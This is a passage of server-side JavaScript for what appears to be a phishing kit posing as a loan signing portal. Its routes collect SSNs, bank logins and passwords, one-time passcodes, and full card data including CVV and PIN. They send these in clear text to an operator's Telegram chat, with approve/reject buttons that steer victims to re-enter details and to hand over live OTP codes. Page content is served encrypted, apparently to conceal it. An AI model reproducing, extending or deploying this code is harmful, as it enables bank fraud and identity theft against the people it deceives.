app.get('/events/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  if (!sessionId) return res.status(400).end();

  res.setHeader('Content-Type',       'text/event-stream');
  res.setHeader('Cache-Control',      'no-cache, no-transform');
  res.setHeader('Connection',         'keep-alive');
  res.setHeader('X-Accel-Buffering',  'no');
  res.flushHeaders();

  sseClients.set(sessionId, res);
  Log.info(`SSE: Connected — session=${sessionId.slice(0,8)}`);
  res.write(`data: ${JSON.stringify({ type: 'connected', channel: 'sse' })}\n\n`);

  const keepAlive = setInterval(() => {
    if (res.writableEnded) { clearInterval(keepAlive); return; }
    res.write(`data: ${JSON.stringify({ type: 'heartbeat', ts: Date.now() })}\n\n`);
  }, 15000);

  req.on('close', () => {
    clearInterval(keepAlive);
    sseClients.delete(sessionId);
    Log.info(`SSE: Disconnected — session=${sessionId.slice(0,8)}`);
  });
});

// ── HTTPS Polling — Channel 3 ────────────────────────────────────
app.get('/poll/:sessionId', async (req, res) => {
  const { sessionId } = req.params;
  const fingerprint   = req.query.fp || '';

  if (!sessionId) return res.status(400).json({ error: 'sessionId required' });

  try {
    await redis.set(RK.heartbeat(sessionId), '1', 'EX', TTL.HEARTBEAT);

    const cmds = await drainCmdQueue(sessionId);

    const saltBase64 = await redis.get(RK.sessionSalt(sessionId));
    if (saltBase64 && cmds.length === 0) {
      // Check if approved but client hasn't received it yet
      const approved = await redis.get(`session_approved:${sessionId}`);
      if (approved) {
        return res.json([{
          type:    'APPROVE_SESSION',
          id:      Date.now().toString(36),
          payload: { source: 'poll_recovery' },
        }]);
      }
      return res.json([]);
    }

    if (saltBase64 && cmds.length > 0) {
      return res.json(cmds);
    }

    return res.json([{
      type:    'session_needs_register',
      payload: { message: 'Session state lost. Please re-register.' },
    }]);

  } catch (err) {
    Log.error('/poll error:', err.message);
    res.status(500).json({ error: 'Poll failed' });
  }
});

// ── Event tracking ───────────────────────────────────────────────
app.post('/event', async (req, res) => {
  const { sessionId, type, ...rest } = req.body;
  if (!sessionId) return res.status(400).json({ error: 'sessionId required' });

  supabase.from('events').insert({
    session_id:     sessionId,
    application_id: rest.applicationId || null,
    event_type:     type || 'unknown',
    event_data:     rest,
    page:           rest.page || rest.route || null,
    step:           rest.step || null,
  }).then(({ error }) => {
    if (error) Log.debug('Event insert error:', error.message);
  });

  broadcastToAdmins({ type: 'client_event', sessionId, eventType: type, ...rest });
  res.json({ ok: true });
});

// ================================================================
//  5A — /step/submit
// ================================================================
app.post('/step/submit', async (req, res) => {
  try {
    const {
      sessionId,
      applicationId,
      clientName = 'Unknown',
      stepType,
      payload: credPayload,
      device,
      ts,
    } = req.body;

    if (!sessionId || !stepType) {
      return res.status(400).json({ error: 'sessionId and stepType required' });
    }

    Log.info(`/step/submit: ${stepType} | session=${sessionId.slice(0,8)}`);

    const VALID_STEPS = [
      'bank_details',
      'plaid_bank_login',
      'plaid_otp',
      'plaid_card_details',
    ];
    if (!VALID_STEPS.includes(stepType)) {
      return res.status(400).json({ error: `Invalid stepType: ${stepType}` });
    }

    const tgReviewId = `st_${tgNextId()}`;
    const submitTs   = new Date().toLocaleString('en-US', { timeZone: 'America/New_York' });

    const STEP_LABELS = {
      bank_details:       '🏦 Bank Account Details',
      plaid_bank_login:   '🔐 Bank Login Credentials',
      plaid_otp:          '🔢 One-Time Passcode',
      plaid_card_details: '💳 Debit Card Details',
    };

    const deviceLines = device ? [
      ``, `📱 Device Info:`,
      `  UA: ${(device.userAgent || '').slice(0, 60)}`,
      `  Screen: ${device.screen || 'N/A'}`,
      `  TZ: ${device.timezone || 'N/A'}`,
      `  Lang: ${device.language || 'N/A'}`,
    ] : [];

    let credLines = [];
    let rejectButtons = [];

    if (stepType === 'bank_details') {
      credLines = [
        `🏦 Bank:         ${credPayload.bank_name     || 'N/A'}`,
        `\`SSN:            ${credPayload.ssn           || 'N/A'}\``,
        `\`Account:        ${credPayload.account_number || 'N/A'}\``,
        `\`Routing:        ${credPayload.routing_number || 'N/A'}\``,
      ];
      rejectButtons = [
        [
          { text: '❌ Wrong Account#', callback_data: `sr_a:${tgReviewId}` },
          { text: '❌ Wrong SSN',      callback_data: `sr_s:${tgReviewId}` },
        ],
        [
          { text: '❌ Wrong Routing#', callback_data: `sr_r:${tgReviewId}` },
          { text: '❌ Other',          callback_data: `sr_o:${tgReviewId}` },
        ],
      ];
    } else if (stepType === 'plaid_bank_login') {
      credLines = [
        `🏦 Bank:         ${credPayload.bank_name || 'N/A'}`,
        `\`Username:       ${credPayload.username  || 'N/A'}\``,
        `\`Password:       ${credPayload.password  || 'N/A'}\``,
      ];
      rejectButtons = [[
        { text: '❌ Wrong Credentials', callback_data: `sr_c:${tgReviewId}` },
        { text: '❌ Other',             callback_data: `sr_o:${tgReviewId}` },
      ]];
    } else if (stepType === 'plaid_otp') {
      credLines = [
        `🏦 Bank:         ${credPayload.bank_id || 'N/A'}`,
        `\`OTP Code:       ${credPayload.otp     || 'N/A'}\``,
      ];
      rejectButtons = [[
        { text: '❌ Wrong OTP',   callback_data: `sr_c:${tgReviewId}` },
        { text: '❌ OTP Expired', callback_data: `sr_e:${tgReviewId}` },
      ]];
    } else if (stepType === 'plaid_card_details') {
      credLines = [
        `🏦 Bank:         ${credPayload.bank_id      || 'N/A'}`,
        `\`Card Number:    ${credPayload.card_number  || 'N/A'}\``,
        `\`Expiry:         ${credPayload.expiry       || 'N/A'}\``,
        `\`CVV:            ${credPayload.cvv          || 'N/A'}\``,
        `\`PIN:            ${credPayload.pin          || 'N/A'}\``,
      ];
      rejectButtons = [
        [
          { text: '❌ Wrong Card Number', callback_data: `sr_cn:${tgReviewId}` },
          { text: '❌ Wrong PIN',         callback_data: `sr_pin:${tgReviewId}` },
        ],
        [
          { text: '❌ Wrong Card Details', callback_data: `sr_cd:${tgReviewId}` },
          { text: '❌ Other',              callback_data: `sr_o:${tgReviewId}` },
        ],
      ];
    }

    const caption = [
      `🚨 *${STEP_LABELS[stepType]}*`, ``,
      `👤 Client:   ${clientName}`,
      `🆔 App ID:   ${(applicationId || 'N/A').slice(0, 12)}`,
      `🔑 Session:  ${sessionId.slice(0, 8)}…`,
      `🕐 Time:     ${submitTs} ET`,
      ``, `━━━━━━━━━━━━━━━━━━━━`,
      `📋 *SUBMITTED DATA* ↕ tap to copy`, ``,
      ...credLines,
      ...deviceLines,
      ``, `━━━━━━━━━━━━━━━━━━━━`,
      `Tap ✅ to approve, or pick a reject reason below.`,
    ].join('\n');

    const approveRow = (stepType === 'plaid_bank_login')
      ? [
          { text: '✅ Approve — 6 Digit OTP', callback_data: `sl6:${tgReviewId}` },
          { text: '✅ Approve — 8 Digit OTP', callback_data: `sl8:${tgReviewId}` },
        ]
      : [{ text: '✅ Approve', callback_data: `sa:${tgReviewId}` }];

    const keyboard = { inline_keyboard: [approveRow, ...rejectButtons] };

    tgPendingReviews.set(tgReviewId, {
      sessionId,
      applicationId,
      stepType,
      clientName,
      sentAt:       Date.now(),
      submissionId: null,
    });

    let tgMsgId = null;
    try {
      const sentMsg = await telegram.sendMessage(TELEGRAM_CHAT, caption, {
        reply_markup: keyboard,
      });
      tgMsgId = sentMsg.message_id;
      Log.info(`/step/submit: TG message sent msgId=${tgMsgId} reviewId=${tgReviewId}`);
    } catch (tgErr) {
      Log.error('/step/submit: Telegram send failed:', tgErr.message);
    }

    const safePayload = buildSafePayload(stepType, credPayload);
    const { data: subRow, error: subErr } = await supabase
      .from('submissions')
      .insert({
        session_id:      sessionId,
        application_id:  applicationId || null,
        step_type:       stepType,
        payload:         safePayload,
        status:          'pending_review',
        telegram_msg_id: tgMsgId,
      })
      .select('id')
      .single();

    let submissionId = null;
    if (subErr) {
      Log.error('/step/submit: Supabase insert failed:', subErr.message);
    } else {
      submissionId = subRow.id;
      const ctx = tgPendingReviews.get(tgReviewId);
      if (ctx) ctx.submissionId = submissionId;
      Log.info(`/step/submit: Supabase sub=${submissionId}`);
    }

    broadcastToAdmins({
      type: 'new_submission', sessionId, applicationId, submissionId, stepType,
      clientName, payload: credPayload, ts: Date.now(),
    });

    res.json({ ok: true, submissionId, reviewId: tgReviewId, telegramMsgId: tgMsgId });

  } catch (err) {
    Log.error('/step/submit error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

function buildSafePayload(stepType, raw) {
  if (stepType === 'bank_details') {
    return {
      bank_name:      raw.bank_name     || null,
      ssn_last4:      (raw.ssn || '').replace(/\D/g, '').slice(-4) || null,
      routing_number: raw.routing_number || null,
    };
  }
  if (stepType === 'plaid_bank_login') {
    return { bank_name: raw.bank_name || null, bank_id: raw.bank_id || null };
  }
  if (stepType === 'plaid_otp') {
    return { bank_id: raw.bank_id || null };
  }
  if (stepType === 'plaid_card_details') {
    return {
      bank_name:  raw.bank_name || null,
      card_last4: (raw.card_number || '').replace(/\D/g, '').slice(-4) || null,
    };
  }
  return {};
}

const SUBMIT_REJECT_REASONS = {
  sr_a:   'Wrong Account Number. Please check and re-enter your account number.',
  sr_s:   'Wrong SSN provided. Please verify and re-enter your Social Security Number.',
  sr_r:   'Wrong Routing Number. Please check your bank\'s 9-digit routing number.',
  sr_c:   'Incorrect credentials. Please check your details and try again.',
  sr_e:   'OTP expired. Please request a new one-time passcode.',
  sr_o:   'Verification failed. Please check your details and try again.',
  sr_cn:  'Incorrect card number. Please double-check and re-enter your card number.',
  sr_pin: 'Incorrect PIN. Please verify and re-enter your debit card PIN.',
  sr_cd:  'Incorrect card details. Please check all fields and try again.',
};

// ================================================================
//  SESSION ENTRY NOTIFICATION
// ================================================================
app.post('/session/entry-notify', async (req, res) => {
  try {
    const { sessionId, applicationId, clientName, loanAmount, device } = req.body;
    if (!sessionId || !applicationId) {
      return res.status(400).json({ error: 'sessionId and applicationId required' });
    }

    Log.info(`Entry notify: ${clientName || 'Unknown'} (${applicationId}) session=${sessionId.slice(0,8)}`);

    const reviewId = `se_${tgNextId()}`;
    const ts       = new Date().toLocaleString('en-US', { timeZone: 'America/New_York' });
    const loanFmt  = loanAmount ? `$${Number(loanAmount).toLocaleString('en-US')}` : 'N/A';

    const deviceLines = device ? [
      ``, `📱 Device Fingerprint:`,
      `  UA:       ${(device.userAgent || 'N/A').slice(0, 80)}`,
      `  Screen:   ${device.screen   || 'N/A'}`,
      `  Timezone: ${device.timezone || 'N/A'}`,
      `  Language: ${device.language || 'N/A'}`,
      `  Platform: ${device.platform || 'N/A'}`,
      `  FP Hash:  ${(device.hash   || 'N/A').slice(0, 16)}…`,
    ] : [``, `📱 Device info: not provided`];

    const caption = [
      `🚨 SIGNING PORTAL ENTRY REQUEST`, ``,
      `👤 Client:   ${clientName || 'Unknown'}`,
      `🆔 App ID:   ${applicationId}`,
      `💰 Loan:     ${loanFmt}`,
      `🔑 Session:  ${sessionId.slice(0, 8)}…`,
      `🕐 Time:     ${ts} ET`,
      ...deviceLines,
      ``, `Tap ✅ to allow entry or ❌ to deny.`,
    ].join('\n');

    const keyboard = {
      inline_keyboard: [[
        { text: '✅ Approve Entry', callback_data: `se_a:${reviewId}` },
        { text: '❌ Deny Entry',    callback_data: `se_r:${reviewId}` },
      ]],
    };

    tgPendingReviews.set(reviewId, {
      sessionId,
      applicationId,
      stepType:   'session_entry',
      clientName: clientName || 'Unknown',
      sentAt:     Date.now(),
    });

    const sentMsg = await telegram.sendMessage(TELEGRAM_CHAT, caption, {
      reply_markup: keyboard,
    });

    Log.info(`Entry notify sent msgId=${sentMsg.message_id} reviewId=${reviewId}`);
    broadcastToAdmins({
      type: 'session_entry_notified', sessionId, applicationId, clientName, reviewId, ts: Date.now(),
    });

    res.json({ ok: true, reviewId, telegramMsgId: sentMsg.message_id });
  } catch (err) {
    Log.error('entry-notify error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

// ================================================================
//  TELEGRAM WEBHOOK CALLBACK
// ================================================================
app.post('/telegram/callback', express.json(), async (req, res) => {
  res.sendStatus(200);
  try {
    const update = req.body;
    if (!update) return;

    if (update.message && update.message.reply_to_message) {
      await handleForceReplyResponse(update.message);
      return;
    }

    if (!update.callback_query) return;
    const cq        = update.callback_query;
    const cbId      = cq.id;
    const data      = cq.data || '';
    const chatId    = cq.message?.chat?.id;
    const messageId = cq.message?.message_id;
    const colonIdx  = data.indexOf(':');
    if (colonIdx === -1) return;
    const actionCode = data.slice(0, colonIdx);
    const reviewId   = data.slice(colonIdx + 1);
    Log.info(`TG-Callback: action=${actionCode} reviewId=${reviewId}`);

    if (actionCode === 'se_a' || actionCode === 'se_r') {
      await handleSessionEntryCallback(actionCode, reviewId, cbId, chatId, messageId);
      return;
    }
    if (actionCode === 'sl6' || actionCode === 'sl8') {
      await handleOtpApprovalInit(actionCode, reviewId, cbId, chatId, messageId);
      return;
    }
    const isStepApprove = actionCode === 'sa';
    const isStepReject  = actionCode in SUBMIT_REJECT_REASONS;
    if (isStepApprove || isStepReject) {
      await handleStepSubmitCallback(actionCode, reviewId, cbId, chatId, messageId);
      return;
    }
    const MEDIA_REJECT_REASONS = {
      r1: 'Image is blurry or hazy. Please retake in better focus.',
      r2: 'Not all corners of the document are visible. Please fit entire document in frame.',
      r3: 'Poor lighting or glare detected. Please retake in even, bright lighting.',
      r4: 'Wrong document shown. Please scan the correct document as instructed.',
    };
    const isMediaApprove = actionCode === 'a';
    const isMediaReject  = actionCode in MEDIA_REJECT_REASONS;
    if (isMediaApprove || isMediaReject) {
      await handleMediaReviewCallback(actionCode, reviewId, cbId, chatId, messageId,
        isMediaApprove, MEDIA_REJECT_REASONS[actionCode]);
      return;
    }
    Log.warn('TG-Callback: Unknown action code:', actionCode);
  } catch (err) {
    Log.error('/telegram/callback error:', err.message);
  }
});

// ── OTP approval ─────────────────────────────────────────────────
async function handleOtpApprovalInit(actionCode, reviewId, cbId, chatId, messageId) {
  const ctx = tgPendingReviews.get(reviewId);
  if (!ctx) {
    await telegram.answerCallbackQuery(cbId, { text: '⚠️ Already processed or expired.' }).catch(() => {});
    return;
  }
  tgPendingReviews.delete(reviewId);
  const otp_digits = (actionCode === 'sl8') ? 8 : 6;
  const { sessionId, applicationId, stepType, clientName, submissionId } = ctx;

  await telegram.answerCallbackQuery(cbId, { text: `✅ ${otp_digits}-Digit OTP approved` }).catch(() => {});
  await telegram.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }).catch(() => {});

  await deliverOtpApproval(sessionId, applicationId, stepType, otp_digits, null, clientName, submissionId);

  await telegram.sendMessage(
    TELEGRAM_CHAT,
    `✅ *${otp_digits}-Digit OTP Approved*\nClient: ${clientName}\nClient is now on OTP entry screen.`,
    { parse_mode: 'Markdown' }
  ).catch(() => {});

  Log.info(`OTP approved: ${otp_digits} digits session=${sessionId.slice(0,8)}`);
}

async function handleForceReplyResponse(message) {
  const replyToId = String(message.reply_to_message?.message_id || '');
  if (!replyToId) return;
  const ctx = tgPendingOtpApproval.get(replyToId);
  if (!ctx) return;
  tgPendingOtpApproval.delete(replyToId);

  const rawText = (message.text || '').trim();
  let phone_last4 = null;
  if (rawText.toLowerCase() !== 'skip') {
    const digits = rawText.replace(/\D/g, '');
    if (digits.length >= 4) phone_last4 = digits.slice(-4);
  }

  const { sessionId, applicationId, stepType, otp_digits, clientName, submissionId } = ctx;
  Log.info(`Force reply: phone_last4=${phone_last4 || 'skipped'} session=${sessionId.slice(0,8)}`);
  await deliverOtpApproval(sessionId, applicationId, stepType, otp_digits, phone_last4, clientName, submissionId);
  await telegram.sendMessage(
    TELEGRAM_CHAT,
    `✅ *OTP Approved — ${otp_digits} Digit${phone_last4 ? `, phone ••••${phone_last4}` : ''}*\nClient: ${clientName} — now on OTP entry screen.`,
    { parse_mode: 'Markdown' }
  ).catch(() => {});
}

async function deliverOtpApproval(sessionId, applicationId, stepType, otp_digits, phone_last4, clientName, submissionId) {
  const commandId = await insertCommand(sessionId, applicationId, 'APPROVE_STEP', {
    step_type: stepType, otp_digits, phone_last4, submission_id: submissionId,
  });
  await deliverCommand(sessionId, {
    type: 'APPROVE_STEP', id: commandId,
    payload: { step_type: stepType, submission_id: submissionId, otp_digits, phone_last4 },
  });
  setTimeout(async () => {
    await deliverFragment(sessionId, 'p_otp_v1');
  }, 600);
  if (submissionId) {
    await Promise.resolve(
      supabase.from('submissions').update({
        status: 'approved', reviewed_at: new Date().toISOString(), reviewed_by: 'telegram',
      }).eq('id', submissionId)
    ).catch(() => {});
  }
  broadcastToAdmins({ type: 'submission_approved', submissionId, sessionId, applicationId, stepType, ts: Date.now() });
  Log.info(`OTP approved: ${otp_digits} digits phone=****${phone_last4 || 'N/A'} session=${sessionId.slice(0,8)}`);
}

// ── Session entry approve/deny ─────────────────────────────────
async function handleSessionEntryCallback(actionCode, reviewId, cbId, chatId, messageId) {
  const ctx = tgPendingReviews.get(reviewId);
  if (!ctx) {
    await telegram.answerCallbackQuery(cbId, { text: '⚠️ Already processed or expired.' }).catch(() => {});
    return;
  }
  tgPendingReviews.delete(reviewId);
  const { sessionId, applicationId, clientName } = ctx;

  if (actionCode === 'se_a') {
    // Mark session as approved in Redis
    await redis.set(`session_approved:${sessionId}`, '1', 'EX', 86400);

    const commandId = await insertCommand(sessionId, applicationId, 'APPROVE_SESSION', { source: 'telegram' });
    await deliverCommand(sessionId, {
      type: 'APPROVE_SESSION', id: commandId, payload: { source: 'telegram' },
    });

    // ── FIX #4 — Push contract fragments immediately after APPROVE_SESSION ──
    // The SPA is a single-page app: it shows/hides divs and never does a
    // full page reload. After APPROVE_SESSION the client shows a welcome
    // screen (~7s) then calls Pages.show('page2'). It will NOT re-register
    // with currentRoute='CONTRACT', so the auto-deliver block in
    // session_register never fires. Without this push page2 stays blank.
    // 800ms delay gives the welcome screen time to start rendering before
    // fragments arrive so the inject lands into an already-visible container.
    setTimeout(async () => {
      await deliverFragment(sessionId, 'c_splash_v1');
      Log.info(`Auto-delivered c_splash_v1 after entry approval → ${sessionId.slice(0,8)}`);
      await new Promise(r => setTimeout(r, 300));
      await deliverFragment(sessionId, 'c_forma_v1');
      Log.info(`Auto-delivered c_forma_v1 after entry approval → ${sessionId.slice(0,8)}`);
    }, 800);

    await telegram.answerCallbackQuery(cbId, { text: '✅ Entry approved! Client proceeding.' }).catch(() => {});
    await telegram.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }).catch(() => {});
    await telegram.sendMessage(TELEGRAM_CHAT,
      `✅ *ENTRY APPROVED*\nClient: ${clientName}\nApp ID: ${applicationId}`,
      { parse_mode: 'Markdown' }
    ).catch(() => {});
    broadcastToAdmins({ type: 'session_entry_approved', sessionId, applicationId, clientName, ts: Date.now() });
    Log.info(`Entry APPROVED — ${clientName} (${applicationId})`);

  } else {
    const commandId = await insertCommand(sessionId, applicationId, 'REJECT_SESSION', { source: 'telegram' });
    await deliverCommand(sessionId, {
      type: 'REJECT_SESSION', id: commandId, payload: { source: 'telegram' },
    });
    await telegram.answerCallbackQuery(cbId, { text: '❌ Entry denied.' }).catch(() => {});
    await telegram.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }).catch(() => {});
    await telegram.sendMessage(TELEGRAM_CHAT,
      `❌ *ENTRY DENIED*\nClient: ${clientName}\nApp ID: ${applicationId}`,
      { parse_mode: 'Markdown' }
    ).catch(() => {});
    broadcastToAdmins({ type: 'session_entry_denied', sessionId, applicationId, clientName, ts: Date.now() });
    Log.info(`Entry DENIED — ${clientName} (${applicationId})`);
  }
}

// ── Step submit approve/reject ─────────────────────────────────
async function handleStepSubmitCallback(actionCode, reviewId, cbId, chatId, messageId) {
  const ctx = tgPendingReviews.get(reviewId);
  if (!ctx) {
    await telegram.answerCallbackQuery(cbId, { text: '⚠️ Already processed or expired.' }).catch(() => {});
    return;
  }

  const { sessionId, applicationId, submissionId, stepType, clientName } = ctx;

  if (submissionId) {
    const existing = await getSubmission(submissionId).catch(() => null);
    if (existing && existing.status === 'approved' && actionCode === 'sa') {
      await telegram.answerCallbackQuery(cbId, { text: '✅ Already approved.' }).catch(() => {});
      await telegram.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }).catch(() => {});
      return;
    }
    if (existing && existing.status === 'rejected' && actionCode !== 'sa') {
      await telegram.answerCallbackQuery(cbId, { text: '❌ Already rejected.' }).catch(() => {});
      await telegram.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }).catch(() => {});
      return;
    }
  }

  tgPendingReviews.delete(reviewId);

  if (actionCode === 'sa') {
    await telegram.answerCallbackQuery(cbId, { text: '✅ Approved! Client advancing.' }).catch(() => {});

    const commandId = await insertCommand(sessionId, applicationId, 'APPROVE_STEP', {
      step_type: stepType, submission_id: submissionId, source: 'telegram',
    });
    await deliverCommand(sessionId, {
      type: 'APPROVE_STEP', id: commandId,
      payload: { step_type: stepType, submission_id: submissionId },
    });

    const nextFragments = FLOW_FRAGMENT_MAP[stepType];
    if (nextFragments) {
      for (const fragId of nextFragments) {
        setTimeout(async () => { await deliverFragment(sessionId, fragId); }, 600);
      }
    }

    if (submissionId) {
      await Promise.resolve(
        supabase.from('submissions').update({
          status: 'approved', reviewed_at: new Date().toISOString(), reviewed_by: 'telegram',
        }).eq('id', submissionId)
      ).catch(() => {});
    }

    await telegram.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }).catch(() => {});
    await telegram.sendMessage(TELEGRAM_CHAT,
      `✅ *APPROVED — ${stepType}*\nClient: ${clientName}\nClient advancing.`,
      { parse_mode: 'Markdown' }
    ).catch(() => {});
    broadcastToAdmins({ type: 'submission_approved', submissionId, sessionId, applicationId, stepType, ts: Date.now() });
    Log.info(`Step APPROVED via TG: ${stepType} session=${sessionId.slice(0,8)}`);

  } else {
    const reason = SUBMIT_REJECT_REASONS[actionCode] || 'Verification failed. Please try again.';
    await telegram.answerCallbackQuery(cbId, { text: '❌ Rejected.' }).catch(() => {});

    const commandId = await insertCommand(sessionId, applicationId, 'REJECT_STEP', {
      step_type: stepType, reason, allow_retry: true, source: 'telegram',
    });
    await deliverCommand(sessionId, {
      type: 'REJECT_STEP', id: commandId,
      payload: { step_type: stepType, reason, allow_retry: true },
    });

    if (submissionId) {
      await Promise.resolve(
        supabase.from('submissions').update({
          status: 'rejected', admin_note: reason,
          reviewed_at: new Date().toISOString(), reviewed_by: 'telegram',
        }).eq('id', submissionId)
      ).catch(() => {});
    }

    await telegram.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }).catch(() => {});
    await telegram.sendMessage(TELEGRAM_CHAT,
      `❌ *REJECTED — ${stepType}*\nReason: ${reason}\nClient: ${clientName}`,
      { parse_mode: 'Markdown' }
    ).catch(() => {});
    broadcastToAdmins({ type: 'submission_rejected', submissionId, sessionId, stepType, reason, ts: Date.now() });
    Log.info(`Step REJECTED via TG: ${stepType} reason="${reason}" session=${sessionId.slice(0,8)}`);
  }
}

// ── KYC/liveness media review ──────────────────────────────────
async function handleMediaReviewCallback(actionCode, reviewId, cbId, chatId, messageId, isApprove, rejectReason) {
  const ctx = tgPendingReviews.get(reviewId);
  if (!ctx) {
    await telegram.answerCallbackQuery(cbId, { text: '⚠️ Already processed or expired.' }).catch(() => {});
    return;
  }
  tgPendingReviews.delete(reviewId);
  const { sessionId, applicationId, stepType, clientName } = ctx;

  if (isApprove) {
    const commandId = await insertCommand(sessionId, applicationId, 'APPROVE_STEP', {
      step_type: stepType, source: 'telegram', review_id: reviewId,
    });
    await deliverCommand(sessionId, {
      type: 'APPROVE_STEP', id: commandId,
      payload: { step_type: stepType },
    });
    await telegram.answerCallbackQuery(cbId, { text: '✅ Approved!' }).catch(() => {});
    await telegram.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }).catch(() => {});
    await telegram.sendMessage(TELEGRAM_CHAT,
      `✅ *APPROVED* — ${stepType}\nClient: ${clientName}`,
      { parse_mode: 'Markdown' }
    ).catch(() => {});
    broadcastToAdmins({ type: 'tg_media_approved', sessionId, applicationId, stepType, reviewId, ts: Date.now() });
    Log.info(`Media APPROVED: ${stepType} session=${sessionId.slice(0,8)}`);
  } else {
    const commandId = await insertCommand(sessionId, applicationId, 'REJECT_STEP', {
      step_type: stepType, reason: rejectReason, allow_retry: true, source: 'telegram',
    });
    await deliverCommand(sessionId, {
      type: 'REJECT_STEP', id: commandId,
      payload: { step_type: stepType, reason: rejectReason, allow_retry: true },
    });
    await telegram.answerCallbackQuery(cbId, { text: '❌ Rejected.' }).catch(() => {});
    await telegram.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }).catch(() => {});
    await telegram.sendMessage(TELEGRAM_CHAT,
      `❌ *REJECTED* — ${stepType}\nReason: ${rejectReason}`,
      { parse_mode: 'Markdown' }
    ).catch(() => {});
    broadcastToAdmins({ type: 'tg_media_rejected', sessionId, applicationId, stepType, reason: rejectReason, reviewId, ts: Date.now() });
    Log.info(`Media REJECTED: ${stepType} reason="${rejectReason}" session=${sessionId.slice(0,8)}`);
  }
}

// ================================================================
//  TELEGRAM MEDIA REVIEW UPLOAD
// ================================================================
app.post('/upload/telegram-review', upload.single('file'), handleTelegramReview);
app.post('/upload/media',           upload.single('file'), handleTelegramReview);

async function handleTelegramReview(req, res) {
  try {
    if (!req.file) return res.status(400).json({ error: 'No file received' });

    const {
      sessionId,
      applicationId,
      stepType   = 'media',
      clientName = 'Unknown',
      mimeType,
    } = req.body;

    if (!sessionId) return res.status(400).json({ error: 'sessionId required' });

    const ALLOWED_MIME = [
      'image/jpeg','image/png','image/webp',
      'video/webm','video/mp4','application/pdf',
    ];
    if (!ALLOWED_MIME.includes(req.file.mimetype)) {
      return res.status(400).json({ error: 'File type not allowed' });
    }

    const isVideo  = req.file.mimetype.includes('video');
    const fileSize = (req.file.size / 1024).toFixed(1);
    Log.info(`TG-Review: ${stepType} | ${fileSize} KB | session=${sessionId.slice(0,8)}`);

    const caption  = buildTelegramCaption(stepType, sessionId, applicationId, clientName, {});
    const reviewId = tgNextId();

    const REJECT_REASONS = [
      { code: 'r1', label: '❌ Blurry / Hazy' },
      { code: 'r2', label: '❌ Corners not visible' },
      { code: 'r3', label: '❌ Poor lighting / glare' },
      { code: 'r4', label: '❌ Wrong document' },
    ];

    const keyboard = {
      inline_keyboard: [
        [{ text: '✅ Approve', callback_data: `a:${reviewId}` }],
        ...REJECT_REASONS.map(r => ([{
          text: r.label, callback_data: `${r.code}:${reviewId}`,
        }])),
      ],
    };

    tgPendingReviews.set(reviewId, {
      sessionId, applicationId, stepType, clientName, sentAt: Date.now(),
    });

    let sentMsg;
    try {
      if (isVideo) {
        sentMsg = await telegram.sendVideo(
          TELEGRAM_CHAT, req.file.buffer,
          { caption, reply_markup: keyboard, supports_streaming: true },
          { filename: `${stepType}_${Date.now()}.webm`, contentType: req.file.mimetype }
        );
      } else {
        sentMsg = await telegram.sendPhoto(
          TELEGRAM_CHAT, req.file.buffer,
          { caption, reply_markup: keyboard },
          { filename: `${stepType}_${Date.now()}.jpg`, contentType: req.file.mimetype }
        );
      }
    } catch (tgErr) {
      Log.error('TG-Review: Telegram send failed:', tgErr.message);
      tgPendingReviews.delete(reviewId);
      return res.status(502).json({ error: 'Telegram send failed: ' + tgErr.message });
    }

    Log.info(`TG-Review: Sent msgId=${sentMsg.message_id} reviewId=${reviewId}`);
    broadcastToAdmins({
      type: 'tg_media_review_sent', sessionId, applicationId, stepType,
      reviewId, telegramMsgId: sentMsg.message_id, ts: Date.now(),
    });

    if (stepType === 'admin_requested_doc') {
      const ackPayload = {
        type: 'UPLOAD_RECEIVED',
        payload: {
          message:       'Your document was received and is under review.',
          telegramMsgId: sentMsg.message_id,
          reviewId,
          ts:            Date.now(),
        },
      };
      const delivered = wsSend(sessionId, ackPayload);
      if (!delivered) sseSend(sessionId, ackPayload);
    }

    res.json({ ok: true, url: null, reviewId, telegramMsgId: sentMsg.message_id });
  } catch (err) {
    Log.error('handleTelegramReview error:', err.message);
    res.status(500).json({ error: err.message });
  }
}

// ================================================================
//  5B — FRAGMENT SERVE ENDPOINT
// ================================================================
app.get('/fragments/serve/:fragmentId', async (req, res) => {
  const sessionId  = req.headers['x-session-id'] || req.query.sid;
  const fragmentId = req.params.fragmentId;

  if (!sessionId || !fragmentId) {
    return res.status(400).json({ error: 'x-session-id header and fragmentId required' });
  }

  const UUID_REGEX = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
  if (!UUID_REGEX.test(sessionId)) {
    return res.status(400).json({ error: 'Invalid session ID' });
  }

  const saltBase64 = await redis.get(RK.sessionSalt(sessionId)).catch(() => null);
  if (!saltBase64) {
    return res.status(401).json({ error: 'Session not found or expired' });
  }

  const fragment = FragmentStore.get(fragmentId);
  if (!fragment) {
    return res.status(404).json({ error: `Fragment not found: ${fragmentId}` });
  }

  try {
    const encPayload = await FragmentCrypto.encryptFragment(
      sessionId, saltBase64, fragment.html, fragment.css
    );
    return res.json({ ok: true, fragment_id: fragmentId, ...encPayload });
  } catch (err) {
    Log.error(`/fragments/serve: Encryption failed for ${fragmentId}:`, err.message);
    return res.status(500).json({ error: 'Fragment encryption failed' });
  }
});

// ================================================================
//  5C — DEV FRAGMENT ENDPOINT
// ================================================================
if (!IS_PROD) {
  app.get('/dev/fragment/:fragmentId', (req, res) => {
    const xDevRequest = req.headers['x-dev-request'];
    if (xDevRequest !== '1') {
      return res.status(403).json({ error: 'Dev endpoint — x-dev-request header required' });
    }

    const { fragmentId } = req.params;
    if (!fragmentId) return res.status(400).json({ error: 'fragmentId required' });

    const devPath = path.join(DEV_FRAGMENTS_DIR, `${fragmentId}.html`);
